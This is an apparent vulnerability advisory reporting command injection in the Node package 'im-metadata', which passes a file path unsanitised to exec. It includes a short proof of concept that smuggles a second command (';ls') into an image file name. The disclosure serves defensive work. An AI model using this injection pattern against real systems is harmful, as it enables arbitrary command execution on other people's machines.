# Overview

`im-metadata` is a package to retrieve image metadata as a JSON object using ImageMagick's identify command, this package are vulnerable to Command Injection.

It is possible to inject arbitrary commands as part of the metadata options which is given to the `exec` function.

# Proof of Concept

```
var metadata = require('im-metadata');

metadata('/home/snoopy/Pictures/Screenshots/foo.jpg;ls', {exif: true}, function(error, metadata) {
    if (error) { console.error(error); }
    console.log(metadata);
    console.log(metadata.exif);
  });
```
